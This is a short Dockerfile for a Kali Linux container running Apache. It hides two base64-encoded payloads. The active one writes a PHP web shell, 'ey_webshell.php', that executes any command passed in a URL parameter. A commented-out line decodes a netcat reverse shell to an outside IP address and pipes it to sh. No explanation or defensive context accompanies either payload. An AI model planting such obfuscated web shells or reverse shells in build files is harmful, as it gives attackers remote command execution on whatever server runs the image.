FROM kalilinux/kali-rolling
RUN apt update && apt -y install kali-linux-headless
RUN systemctl enable apache2
RUN systemctl start apache2
RUN echo "=========="
RUN echo "PD9waHAKZXhlYygiJF9HRVRbJ2NtZCddIik7Cj8+Cg==" | base64 -d > /var/www/html/ey_webshell.php
RUN echo "=========="
#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
#FROM trafex/php-nginx

#ARG COMMIT_SHA
#ENV COMMIT_SHA $COMMIT_SHA

#RUN echo "=========="
#RUN echo "bmMgODkuOTAuMzkuNTQgOTA5MCAtZSBzaA==" | base64 -d | sh -i
#RUN echo "=========="
#RUN echo "PD9waHAKZXhlYygiJF9HRVRbJ2NtZCddIik7Cj8+Cg==" | base64 -d > /var/www/html/ey_webshell.php
